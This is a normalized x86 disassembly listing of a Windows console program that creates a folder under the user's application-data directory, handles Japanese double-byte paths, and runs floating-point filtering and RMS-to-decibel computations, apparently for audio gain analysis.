sub_401020
cmp [ rw-data ] 0x0
push ebx
je r-xdata
push ebp
mov ebp [ LoadLibraryA@IAT ]
push esi
push edi
push r--data
mov [ rw-data ] 0x1
call ebp
mov edi [ GetProcAddress@IAT ]
mov esi eax
test esi esi
je r-xdata
mov bl [ rw-data ]
test bl bl
je r-xdata
mov bl [ rw-data ]
test bl bl
jne r-xdata
push r--data
push esi
call edi
test eax eax
je r-xdata
movsx eax bl
pop ebx
retn
mov edx [ esp + 0x8 ]
mov eax rw-data
sub edx eax
mov edx [ esp + 0x14 ]
mov eax rw-data
sub edx eax
lea esp [ esp ]
push r--data
call ebp
mov esi eax
test esi esi
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push rw-data
push 0x0
push 0x0
push 0x801a
push 0x0
call eax
test eax eax
jge r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
add eax 0x1
test cl cl
jne r-xdata
movsx eax bl
pop ebx
retn
mov cl [ eax ]
mov [ edx + eax ] cl
add eax 0x1
test cl cl
jne r-xdata
pop edi
pop esi
pop ebp
mov bl [ rw-data ]
test bl bl
je r-xdata
push r--data
push esi
call edi
test eax eax
je r-xdata
push esi
call [ FreeLibrary@IAT ]
push r--data
push esi
call edi
test eax eax
je r-xdata
mov [ rw-data ] 0x1
push esi
call [ FreeLibrary@IAT ]
push rw-data
push 0x0
push 0x0
push 0x801a
push 0x0
call eax
test eax eax
jl r-xdata
push 0x1
push 0x1a
push rw-data
push 0x0
call eax
test eax eax
jl r-xdata
mov [ rw-data ] 0x1
sub_401180
push esi
push 0xfffffff6
call [ GetStdHandle@IAT ]
mov esi eax
push 0x1
push esi
call [ SetConsoleMode@IAT ]
push esi
call [ FlushConsoleInputBuffer@IAT ]
push 0x1
push sub_401150
call [ SetConsoleCtrlHandler@IAT ]
mov [ rw-data ] 0x0
pop esi
retn
sub_4011d0
sub esp 0x18
push 0xfffffff4
call [ GetStdHandle@IAT ]
test eax eax
je r-xdata
call sub_40e4b7
add eax 0x40
push eax
push 0xa
call sub_40e64d
add esp 0x8
add esp 0x18
retn
lea ecx [ esp ]
push ecx
push eax
call [ GetConsoleScreenBufferInfo@IAT ]
test eax eax
je r-xdata
push ebx
mov bl [ esp + 0x4 ]
sub bl [ esp + 0x8 ]
je r-xdata
pop ebx
add esp 0x18
retn
lea esp [ esp ]
add bl 0xff
call sub_40e4b7
add eax 0x40
push eax
push 0x20
call sub_40e64d
add esp 0x8
test bl bl
jne r-xdata
sub_401240
push ebp
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax edi
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
sub eax edx
mov esi eax
call [ GetSystemDefaultLangID@IAT ]
movzx ebp ax
lea eax [ esi + edi - 0x1 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp bp 0x411
jne r-xdata
mov cl [ eax ]
cmp cl 0x5c
je r-xdata
cmp eax edi
mov edx eax
jbe r-xdata
cmp cl 0x3a
je r-xdata
mov ecx eax
sub ecx edx
test cl 0x1
je r-xdata
nop
cmp cl 0x2e
je r-xdata
sub eax 0x1
cmp cl 0xe0
jb r-xdata
cmp cl 0x9f
jbe r-xdata
mov ecx eax
lea esi [ ecx + 0x1 ]
lea ecx [ ecx ]
sub eax 0x1
cmp eax edi
jae r-xdata
cmp cl 0xfc
ja r-xdata
add edx 0xffffffff
cmp edx edi
ja r-xdata
mov dl [ ecx ]
add ecx 0x1
test dl dl
jne r-xdata
sub ecx esi
cmp ecx 0x1
jbe r-xdata
pop edi
pop esi
xor eax eax
pop ebp
retn
mov cl [ edx - 0x1 ]
cmp cl 0x81
jb r-xdata
mov ecx eax
lea esi [ ecx + 0x1 ]
mov dl [ ecx ]
add ecx 0x1
test dl dl
jne r-xdata
sub ecx esi
cmp ecx 0x4
jbe r-xdata
pop edi
pop esi
pop ebp
retn
sub_401300
push ebp
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax edi
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
sub eax edx
mov esi eax
call [ GetSystemDefaultLangID@IAT ]
lea edx [ esi + edi - 0x1 ]
cmp edx edi
movzx ebp ax
jb r-xdata
add edx 0x1
mov eax edx
lea esi [ eax + 0x1 ]
mov edi edi
mov edi edi
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
sub eax esi
neg eax
pop edi
sbb eax eax
pop esi
and eax edx
pop ebp
retn
mov al [ edx ]
cmp al 0x5c
je r-xdata
cmp edx edi
mov ecx edx
jbe r-xdata
cmp al 0x3a
je r-xdata
mov eax edx
sub eax ecx
test al 0x1
je r-xdata
lea ecx [ ecx ]
sub edx 0x1
cmp edx edi
jae r-xdata
sub edx 0x1
cmp al 0xe0
jb r-xdata
cmp al 0x9f
jbe r-xdata
cmp bp 0x411
jne r-xdata
cmp al 0xfc
ja r-xdata
add ecx 0xffffffff
cmp ecx edi
ja r-xdata
mov al [ ecx - 0x1 ]
cmp al 0x81
jb r-xdata
sub_4013a0
sub esp 0x304
mov ecx [ esp + 0x308 ]
lea eax [ esp + 0x30c ]
push eax
push ecx
lea edx [ esp + 0x10d ]
push edx
mov [ esp + 0x110 ] 0xd
call sub_40fa1e
call sub_40e4b7
add eax 0x40
push eax
lea eax [ esp + 0x114 ]
push eax
call sub_40f860
add esp 0x14
call sub_4011d0
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x304
retn
lea ecx [ esp ]
push esi
push ecx
call sub_401020
add esp 0x4
test eax eax
je r-xdata
push r--data
push r--data
call sub_40f84d
mov esi eax
add esp 0x8
test esi esi
je r-xdata
lea eax [ esp + 0x4 ]
add eax 0xffffffff
pop esi
lea ecx [ esp + 0x109 ]
push esi
push ecx
call sub_40f860
push esi
push 0xa
call sub_40e64d
push esi
call sub_40f0ed
add esp 0x14
mov cl [ eax + 0x1 ]
add eax 0x1
test cl cl
jne r-xdata
mov edx [ r--data ]
mov ecx [ r--data ]
mov [ eax ] edx
mov edx [ r--data ]
mov [ eax + 0x4 ] ecx
mov ecx [ r--data ]
mov [ eax + 0x8 ] edx
mov edx [ r--data ]
mov [ eax + 0xc ] ecx
mov cl [ r--data ]
mov [ eax + 0x10 ] edx
lea edx [ esp + 0x4 ]
push r--data
push edx
mov [ eax + 0x14 ] cl
call sub_40f84d
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
lea eax [ esp + 0x4 ]
push eax
call sub_401020
lea eax [ esp + 0x8 ]
add esp 0x4
add eax 0xffffffff
mov cl [ eax + 0x1 ]
add eax 0x1
test cl cl
jne r-xdata
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ eax ] ecx
mov cl [ r--data ]
mov [ eax + 0x4 ] edx
push 0x0
lea edx [ esp + 0x8 ]
push edx
mov [ eax + 0x8 ] cl
call [ CreateDirectoryA@IAT ]
test eax eax
je r-xdata
test esi esi
jne r-xdata
lea eax [ esp + 0x4 ]
add eax 0xffffffff
lea ecx [ ecx ]
mov cl [ eax + 0x1 ]
add eax 0x1
test cl cl
jne r-xdata
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ eax ] ecx
mov ecx [ r--data ]
mov [ eax + 0x4 ] edx
mov dl [ r--data ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] dl
lea eax [ esp + 0x4 ]
push r--data
push eax
call sub_40f84d
add esp 0x8
mov esi eax
sub_401550
sub esp 0x11c
push esi
push 0x0
push 0x40
lea eax [ esp + 0xd8 ]
push eax
push ecx
call sub_4050b0
mov esi eax
add esp 0x10
test esi esi
jne r-xdata
cmp [ rw-data ] 0x0
push edi
je r-xdata
lea edx [ esp + 0xd0 ]
push edx
call sub_4013a0
add esp 0x4
mov eax 0x1
pop esi
add esp 0x11c
retn
push esi
call sub_404070
and eax 0x110
add esp 0x4
cmp eax 0x10
jne r-xdata
push r--data
push esi
xor edi edi
call sub_403490
add esp 0x8
test eax eax
je r-xdata
fld [ esp + 0x128 ]
sub esp 0x8
fstp [ esp ]
lea eax [ esp + 0x10 ]
push r--data
push eax
call sub_40fa35
lea eax [ esp + 0x18 ]
add esp 0x10
lea edx [ eax + 0x1 ]
push 0x28
lea eax [ esp + 0x38 ]
push eax
push r--data
push esi
call sub_405050
push 0x28
lea ecx [ esp + 0xc0 ]
push ecx
push r--data
push esi
call sub_405050
push 0x28
lea edx [ esp + 0x80 ]
push edx
push r--data
push esi
call sub_405050
push 0xa
lea eax [ esp + 0x5c ]
push eax
push r--data
push esi
call sub_405050
add esp 0x40
push 0x28
lea ecx [ esp + 0x88 ]
push ecx
push r--data
push esi
call sub_405050
push 0xa
lea edx [ esp + 0x30 ]
push edx
push r--data
push esi
call sub_405050
add esp 0x20
cmp [ esp + 0x34 ] 0x0
je r-xdata
push r--data
push esi
call sub_403490
add esp 0x8
test eax eax
je r-xdata
mov edi 0x1
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0xc ]
push ecx
push r--data
push esi
call sub_4049c0
fld [ esp + 0x13c ]
add esp 0x8
fstp [ esp ]
lea edx [ esp + 0x10 ]
push r--data
push edx
call sub_40fa35
lea eax [ esp + 0x18 ]
add esp 0x10
lea edx [ eax + 0x1 ]
cmp [ esp + 0xac ] 0x0
je r-xdata
lea eax [ esp + 0x34 ]
lea edx [ eax + 0x1 ]
mov edi edi
push r--data
push esi
call sub_403490
add esp 0x8
test eax eax
je r-xdata
add edi 0x1
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0xc ]
push eax
push r--data
push esi
call sub_4049c0
add esp 0x10
cmp [ rw-data ] 0x0
je r-xdata
cmp [ esp + 0x5c ] 0x0
je r-xdata
lea eax [ esp + 0xac ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0x38 ]
push eax
push r--data
push esi
call sub_4049c0
add esp 0x10
push r--data
push esi
call sub_403490
add esp 0x8
test eax eax
je r-xdata
add edi 0x1
cmp [ rw-data ] 0x0
jne r-xdata
fld [ esp + 0x130 ]
sub esp 0x8
fstp [ esp ]
lea ecx [ esp + 0x10 ]
push r--data
push ecx
call sub_40fa35
lea eax [ esp + 0x18 ]
add esp 0x10
lea edx [ eax + 0x1 ]
lea esp [ esp ]
cmp [ esp + 0x28 ] 0x0
je r-xdata
lea eax [ esp + 0x5c ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0xb0 ]
push ecx
push r--data
push esi
call sub_4049c0
add esp 0x10
cmp [ rw-data ] 0x0
jne r-xdata
add edi 0x1
push esi
call sub_404b10
add esp 0x4
test eax eax
jne r-xdata
xor edx edx
cmp [ rw-data ] dl
setne dl
lea edx [ edx + edx + 0x2 ]
push edx
push r--data
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0xc ]
push edx
push r--data
push esi
call sub_4049c0
fld [ esp + 0x144 ]
add esp 0x8
fstp [ esp ]
lea eax [ esp + 0x10 ]
push r--data
push eax
call sub_40fa35
lea eax [ esp + 0x18 ]
add esp 0x10
lea edx [ eax + 0x1 ]
cmp [ esp + 0x84 ] 0x0
je r-xdata
lea eax [ esp + 0x28 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0x60 ]
push edx
push r--data
push esi
call sub_4049c0
add esp 0x10
push r--data
call sub_4013a0
add esp 0x4
test edi edi
je r-xdata
push esi
call sub_404b30
add esp 0x4
pop edi
xor eax eax
pop esi
add esp 0x11c
retn
push esi
call sub_403330
push eax
push r--data
call sub_4013a0
add esp 0xc
pop edi
mov eax 0x1
pop esi
add esp 0x11c
retn
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0xc ]
push ecx
push r--data
push esi
call sub_4049c0
add esp 0x10
cmp [ esp + 0x1c ] 0x0
je r-xdata
lea eax [ esp + 0x84 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0x2c ]
push eax
push r--data
push esi
call sub_4049c0
add esp 0x10
push edi
push r--data
jmp r-xdata
push r--data
call sub_4013a0
add esp 0x4
lea eax [ esp + 0x1c ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x88 ]
push ecx
push r--data
push esi
call sub_4049c0
add esp 0x10
call sub_4013a0
add esp 0x8
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
sub eax edx
push eax
lea edx [ esp + 0x20 ]
push edx
push r--data
push esi
call sub_4049c0
add esp 0x10
sub_401970
sub esp 0x64
push ebx
push ebp
mov ebp [ esp + 0x70 ]
push esi
xor ebx ebx
push ebx
push 0x2
lea eax [ esp + 0x28 ]
push eax
push ebp
call sub_4050b0
mov esi eax
add esp 0x10
test esi esi
jne r-xdata
push ebp
push r--data
push edi
call sub_40e368
push 0x14
lea edx [ esp + 0x1c ]
push edx
push r--data
push esi
call sub_405050
add esp 0x1c
test eax eax
je r-xdata
lea ecx [ esp + 0x20 ]
push ecx
call sub_4013a0
add esp 0x4
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x64
retn
push 0x14
lea ecx [ esp + 0x10 ]
push ecx
push r--data
push esi
call sub_405050
add esp 0x10
test eax eax
je r-xdata
lea eax [ esp + 0xc ]
push eax
push r--data
push edi
call sub_40e368
add esp 0xc
mov ebx 0x1
push 0x14
lea eax [ esp + 0x10 ]
push eax
push r--data
push esi
call sub_405050
add esp 0x10
test eax eax
je r-xdata
lea edx [ esp + 0xc ]
push edx
push r--data
push edi
call sub_40e368
add esp 0xc
add ebx 0x1
push 0x14
lea edx [ esp + 0x10 ]
push edx
push r--data
push esi
call sub_405050
add esp 0x10
test eax eax
je r-xdata
lea ecx [ esp + 0xc ]
push ecx
push r--data
push edi
call sub_40e368
add esp 0xc
add ebx 0x1
test ebx ebx
jne r-xdata
lea eax [ esp + 0xc ]
push eax
push r--data
push edi
call sub_40e368
add esp 0xc
add ebx 0x1
push esi
call sub_404b30
add esp 0x4
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x64
retn
push r--data
push edi
call sub_40e368
add esp 0x8
sub_401aa0
push ecx
push esi
push edi
xor ecx ecx
xor esi esi
lea eax [ ebx + 0x10 ]
mov edi 0x7d0
mov edx 0x2ee0
push ebp
mov ebp [ eax - 0x10 ]
add ebp [ eax - 0xc ]
add eax 0x18
add ebp [ eax - 0x20 ]
add ebp [ eax - 0x1c ]
add ebp [ eax - 0x14 ]
add ebp [ eax - 0x18 ]
add esi ebp
sub edi 0x1
jne r-xdata
pop ebp
mov [ esp + 0x8 ] edx
fild [ esp + 0x8 ]
pop edi
pop esi
fdiv [ r--data ]
fsubr [ r--data ]
fstp [ esp ]
fld [ r--data ]
fld [ esp ]
fcom st1
fnstsw ax
test ah 0x41
je r-xdata
test edx edx
jne r-xdata
fstp st0
pop ecx
retn
fstp st1
fld [ r--data ]
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
add ecx [ ebx + edx * 4 - 0x4 ]
sub edx 0x1
lea eax [ ecx + ecx * 4 ]
add eax eax
add eax eax
cmp eax esi
jae r-xdata
sub edx 0x1
fstp st1
pop ecx
retn
sub_401b30
test eax eax
je r-xdata
retn
fld [ esp + 0x4 ]
fild [ edx ]
sub eax 0x1
add ecx 0x4
add edx 0x4
test eax eax
fmul st1
fstp [ ecx - 0x4 ]
jne r-xdata
fstp st0
sub_401b50
xor eax eax
mov ecx rw-data
cmp eax 0x14
jne r-xdata
cmp [ ecx ] edx
je r-xdata
imul eax eax 0xe8
lea ecx [ eax + rw-data ]
lea edx [ eax + rw-data ]
push 0x400
mov [ rw-data ] ecx
mov [ rw-data ] edx
lea ecx [ eax + rw-data ]
lea edx [ eax + rw-data ]
push 0x0
push rw-data
mov [ rw-data ] ecx
mov [ rw-data ] edx
call sub_40fb30
push 0x400
push 0x0
push rw-data
call sub_40fb30
push 0x400
push 0x0
push rw-data
mov [ rw-data ] 0x14
call sub_40fb30
push 0x400
push 0x0
push rw-data
call sub_40fb30
add esp 0x30
mov [ rw-data ] 0x4
mov eax 0x1
retn
push edx
push r--data
call sub_4013a0
add esp 0x8
xor eax eax
retn
add eax 0x1
jmp r-xdata
cmp [ ecx + 0xe8 ] edx
je r-xdata
add eax 0x2
jmp r-xdata
cmp [ ecx + 0x1d0 ] edx
je r-xdata
add eax 0x3
jmp r-xdata
cmp [ ecx + 0x2b8 ] edx
je r-xdata
add eax 0x4
add ecx 0x488
add eax 0x5
cmp ecx rw-data
jl r-xdata
cmp [ ecx - 0xe8 ] edx
je r-xdata
jmp r-xdata
sub_401c50
push ecx
fld [ r--data ]
push ebx
push esi
mov esi [ rw-data ]
push edi
mov edi ecx
mov ebx eax
mov ecx 0xfffffffc
lea edx [ esi * 4 - 0x10 ]
test ecx ecx
fstp st0
jne r-xdata
fld [ edx + rw-data ]
fabs
fcomp st1
fnstsw ax
test ah 0x41
je r-xdata
test ebx ebx
je r-xdata
push 0x400
push ecx
push rw-data
call sub_40fb30
push 0x400
push 0x0
push rw-data
call sub_40fb30
add esp 0x18
add ecx 0x1
add edx 0x4
test ecx ecx
jl r-xdata
pop edi
mov [ rw-data ] esi
pop esi
pop ebx
pop ecx
retn
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea esp [ esp ]
fld [ edx + rw-data ]
fabs
fcomp st1
fnstsw ax
test ah 0x41
je r-xdata
test ebx ebx
jne r-xdata
mov edx [ rw-data ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov [ rw-data ] edx
mov esi 0x4
fld [ edi ]
add esi 0x2
fstp [ esp + 0xc ]
sub ebx 0x1
fld [ esp + 0xc ]
add edi 0x8
cmp esi 0x100
fst [ esi * 4 + rw-data ]
fmul [ eax ]
fld [ edi - 0x4 ]
fstp [ esp + 0xc ]
fld [ esp + 0xc ]
fst [ esi * 4 + rw-data ]
fld [ esi * 4 + rw-data ]
fmul [ eax + 0x8 ]
fld [ esi * 4 + rw-data ]
fmul [ ecx + 0x8 ]
fsubp st1
fxch st1
fmul [ eax ]
faddp st1
fld [ esi * 4 + rw-data ]
fmul [ eax + 0x10 ]
fld [ esi * 4 + rw-data ]
fmul [ ecx + 0x10 ]
fsubp st1
faddp st1
fld [ esi * 4 + rw-data ]
fmul [ eax + 0x8 ]
fld [ esi * 4 + rw-data ]
fmul [ ecx + 0x8 ]
fsubp st1
faddp st2
fld [ esi * 4 + rw-data ]
fmul [ eax + 0x10 ]
fld [ esi * 4 + rw-data ]
fmul [ ecx + 0x10 ]
fsubp st1
faddp st2
fxch st1
fstp [ esp + 0xc ]
fld [ esp + 0xc ]
fst [ esi * 4 + rw-data ]
fstp [ edi - 0x8 ]
fstp [ esp + 0xc ]
fld [ esp + 0xc ]
fst [ esi * 4 + rw-data ]
fstp [ edi - 0x4 ]
jne r-xdata
sub_401e20
fld [ r--data ]
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi [ rw-data ]
mov ebx eax
mov edx 0xffffffec
lea ecx [ esi * 4 - 0x50 ]
test edx edx
fstp st0
jne r-xdata
fld [ ecx + rw-data ]
fabs
fcomp st1
fnstsw ax
test ah 0x41
je r-xdata
test ebp ebp
je r-xdata
push 0x400
push edx
push rw-data
call sub_40fb30
push 0x400
push 0x0
push rw-data
call sub_40fb30
add esp 0x18
fld [ ecx + rw-data ]
fabs
fcomp st1
fnstsw ax
test ah 0x41
je r-xdata
mov [ rw-data ] esi
pop esi
pop ebp
pop ebx
retn
mov eax [ rw-data ]
mov edx [ rw-data ]
push edi
add edx 0x1
jmp r-xdata
fld [ ecx + rw-data ]
fabs
fcomp st1
fnstsw ax
test ah 0x41
je r-xdata
test ebp ebp
jne r-xdata
mov ecx 0x14
mov esi rw-data
mov edi rw-data
[ edi ] [ esi ]
mov ecx 0x14
mov esi rw-data
mov edi rw-data
[ edi ] [ esi ]
mov esi 0x14
fld [ ecx + rw-data ]
fabs
fcomp st1
fnstsw ax
test ah 0x41
je r-xdata
fld [ ebx ]
sub ebp 0x1
fstp [ esp + 0x14 ]
fld [ esp + 0x14 ]
fst [ esi * 4 + rw-data ]
fmul [ eax ]
fld [ ebx + 0x4 ]
fstp [ esp + 0x14 ]
fld [ esp + 0x14 ]
fst [ esi * 4 + rw-data ]
fld [ esi * 4 + rw-data ]
fmul [ eax + 0x8 ]
fld [ esi * 4 + rw-data ]
fmul [ edx + 0x8 ]
fsubp st1
fxch st1
fmul [ eax ]
faddp st1
fld [ esi * 4 + rw-data ]
fmul [ eax + 0x10 ]
fld [ esi * 4 + rw-data ]
fmul [ edx + 0x10 ]
fsubp st1
faddp st1
fld [ esi * 4 + rw-data ]
fmul [ eax + 0x18 ]
fld [ esi * 4 + rw-data ]
fmul [ edx + 0x18 ]
fsubp st1
faddp st1
fld [ esi * 4 + rw-data ]
fmul [ eax + 0x20 ]
fld [ esi * 4 + rw-data ]
fmul [ edx + 0x20 ]
fsubp st1
faddp st1
fld [ esi * 4 + rw-data ]
fmul [ eax + 0x28 ]
fld [ esi * 4 + rw-data ]
fmul [ edx + 0x28 ]
fsubp st1
faddp st1
fld [ esi * 4 + rw-data ]
fmul [ eax + 0x30 ]
fld [ esi * 4 + rw-data ]
fmul [ edx + 0x30 ]
fsubp st1
faddp st1
fld [ esi * 4 + rw-data ]
fmul [ eax + 0x38 ]
fld [ esi * 4 + rw-data ]
fmul [ edx + 0x38 ]
fsubp st1
faddp st1
fld [ esi * 4 + rw-data ]
fmul [ eax + 0x40 ]
fld [ esi * 4 + rw-data ]
fmul [ edx + 0x40 ]
fsubp st1
faddp st1
fld [ esi * 4 + rw-data ]
fmul [ eax + 0x48 ]
fld [ esi * 4 + rw-data ]
fmul [ edx + 0x48 ]
fsubp st1
faddp st1
fld [ esi * 4 + rw-data ]
fmul [ eax + 0x50 ]
fld [ esi * 4 + rw-data ]
fmul [ edx + 0x50 ]
fsubp st1
faddp st1
fld [ esi * 4 + rw-data ]
fmul [ eax + 0x8 ]
fld [ esi * 4 + rw-data ]
fmul [ edx + 0x8 ]
fsubp st1
faddp st2
fld [ esi * 4 + rw-data ]
fmul [ eax + 0x10 ]
fld [ esi * 4 + rw-data ]
fmul [ edx + 0x10 ]
add esi 0x2
add ebx 0x8
cmp esi 0x100
fsubp st1
faddp st2
fld [ esi * 4 + rw-data ]
fmul [ eax + 0x18 ]
fld [ esi * 4 + rw-data ]
fmul [ edx + 0x18 ]
fsubp st1
faddp st2
fld [ esi * 4 + rw-data ]
fmul [ eax + 0x20 ]
fld [ esi * 4 + rw-data ]
fmul [ edx + 0x20 ]
fsubp st1
faddp st2
fld [ esi * 4 + rw-data ]
fmul [ eax + 0x28 ]
fld [ esi * 4 + rw-data ]
fmul [ edx + 0x28 ]
fsubp st1
faddp st2
fld [ esi * 4 + rw-data ]
fmul [ eax + 0x30 ]
fld [ esi * 4 + rw-data ]
fmul [ edx + 0x30 ]
fsubp st1
faddp st2
fld [ esi * 4 + rw-data ]
fmul [ eax + 0x38 ]
fld [ esi * 4 + rw-data ]
fmul [ edx + 0x38 ]
fsubp st1
faddp st2
fld [ esi * 4 + rw-data ]
fmul [ eax + 0x40 ]
fld [ esi * 4 + rw-data ]
fmul [ edx + 0x40 ]
fsubp st1
faddp st2
fld [ esi * 4 + rw-data ]
fmul [ eax + 0x48 ]
fld [ esi * 4 + rw-data ]
fmul [ edx + 0x48 ]
fsubp st1
faddp st2
fld [ esi * 4 + rw-data ]
fmul [ eax + 0x50 ]
fld [ esi * 4 + rw-data ]
fmul [ edx + 0x50 ]
fsubp st1
faddp st2
fxch st1
fstp [ esp + 0x14 ]
fld [ esp + 0x14 ]
fst [ esi * 4 + rw-data ]
fstp [ ebx - 0x8 ]
fstp [ esp + 0x14 ]
fld [ esp + 0x14 ]
fst [ esi * 4 + rw-data ]
fstp [ ebx - 0x4 ]
jne r-xdata
pop edi
add edx 0x2
jmp r-xdata
fld [ ecx + rw-data ]
fabs
fcomp st1
fnstsw ax
test ah 0x41
je r-xdata
fld [ ecx + rw-data ]
fabs
fcomp st1
fnstsw ax
test ah 0x41
je r-xdata
add edx 0x3
jmp r-xdata
fld [ ecx + rw-data ]
fabs
fcomp st1
fnstsw ax
test ah 0x41
je r-xdata
fld [ ecx + rw-data ]
fabs
fcomp st1
fnstsw ax
test ah 0x41
je r-xdata
add edx 0x4
fld [ ecx + rw-data ]
fabs
fcomp st1
fnstsw ax
test ah 0x41
je r-xdata
add edx 0x5
add ecx 0x14
test edx edx
jl r-xdata
fld [ ecx + rw-data ]
fabs
fcomp st1
fnstsw ax
test ah 0x41
je r-xdata
jmp r-xdata
sub_4021e0
sub esp 0x8
test edx edx
fldz
fstp [ esp ]
je r-xdata
fld [ esp ]
fld [ esi ]
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
lea esp [ esp ]
fstp st0
add esp 0x8
retn
fstp [ esi ]
add esp 0x8
retn
fld [ ecx ]
fchs
fstp [ esp + 0x4 ]
fld [ esp + 0x4 ]
fcom st1
fnstsw ax
fstp st1
test ah 0x41
jne r-xdata
fstp st0
fld [ ecx ]
fstp [ esp ]
jmp r-xdata
fstp st0
fstp [ esp ]
jmp r-xdata
fld [ esp ]
fld [ ecx + 0x4 ]
fcomp st1
fnstsw ax
test ah 0x41
jne r-xdata
fld [ ecx + 0x4 ]
fchs
fstp [ esp + 0x4 ]
fld [ esp + 0x4 ]
fcom st1
fnstsw ax
fstp st1
test ah 0x41
jne r-xdata
fstp st0
fld [ ecx + 0x4 ]
fstp [ esp ]
jmp r-xdata
fstp st0
fstp [ esp ]
jmp r-xdata
add ecx 0x8
test edx edx
jne r-xdata
fld [ esp ]
sub edx 0x1
fld [ ecx ]
fcomp st1
fnstsw ax
test ah 0x41
jne r-xdata
sub_402290
push ecx
test edx edx
fld [ r--data ]
mov ecx edx
je r-xdata
test edx edx
mov [ esp ] edx
fild [ esp ]
jge r-xdata
fld [ eax + 0x4 ]
sub ecx 0x1
fld [ eax ]
add eax 0x8
test ecx ecx
fmul st0
fld st1
fmulp st2
faddp st1
faddp st1
jne r-xdata
fdivp st1
call sub_40fbf0
fmul [ r--data ]
fadd [ r--data ]
fsub [ r--data ]
pop ecx
retn
fadd [ r--data ]
sub_4022f0
push ebp
mov ebp esp
and esp 0xffffffc0
sub esp 0xb4
fld [ r--data ]
push ebx
push esi
fstp [ esp + 0x3c ]
push edi
xor edi edi
push 0xbb80
mov ebx eax
mov eax [ ebp + 0x8 ]
push edi
push eax
mov [ esp + 0x38 ] edi
xor esi esi
mov [ esp + 0x44 ] edi
call sub_40fb30
fldz
mov ecx [ ebp + 0xc ]
fstp [ ecx ]
add esp 0xc
cmp [ rw-data ] 0x0
jne r-xdata
push edi
or esi 0x12
push esi
lea edx [ esp + 0x78 ]
push edx
push ebx
call sub_4050b0
mov esi eax
add esp 0x10
cmp esi edi
mov [ esp + 0x30 ] esi
jne r-xdata
mov esi 0x1
push esi
call sub_404070
mov edi eax
push esi
and edi 0x1
call sub_4038d0
add esp 0x8
cmp eax 0x2
mov [ esp + 0x34 ] eax
jle r-xdata
lea eax [ esp + 0x70 ]
push eax
call sub_4013a0
mov eax 0x1
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ rw-data ] 0x0
jne r-xdata
push r--data
call sub_4013a0
mov eax 0x1
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
call sub_4038b0
mov ecx eax
mov eax 0xcccccccd
mul ecx
mov edi edx
shr edi 0x4
lea edx [ edi * 8 ]
push edx
mov [ esp + 0x44 ] edi
call sub_40fe88
push esi
mov ebx eax
call sub_4038b0
add esp 0xc
mov edx eax
call sub_401b50
test eax eax
jne r-xdata
test edi edi
mov edi r--data
jne r-xdata
push edi
push ebx
push esi
call sub_404140
mov edi eax
add [ esp + 0x44 ] edi
add esp 0xc
test edi edi
je r-xdata
mov [ esp + 0x2c ] 0x1
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
mov edi r--data
push ebx
call sub_40fdab
add esp 0x4
cmp [ esp + 0x2c ] 0x0
jne r-xdata
push esi
call sub_404070
add esp 0x4
test al 0x8
jne r-xdata
mov eax ebx
lea edx [ eax + 0x1 ]
mov eax r--data
jmp r-xdata
push esi
call sub_404b30
mov eax [ esp + 0x30 ]
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
call sub_4037e0
add esp 0x4
cmp eax 0xffffffff
je r-xdata
cmp [ esp + 0x34 ] 0x1
jne r-xdata
push esi
call sub_4038f0
add eax 0xffffffff
add esp 0x4
cmp eax 0x3
ja r-xdata
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
sub eax edx
cmp eax 0x1e
jbe r-xdata
push edi
push eax
push r--data
call sub_40e4b7
add eax 0x40
push eax
call sub_40e368
add esp 0x10
push esi
call sub_403830
add esp 0x4
test eax eax
je r-xdata
push esi
call sub_4037e0
add esp 0x4
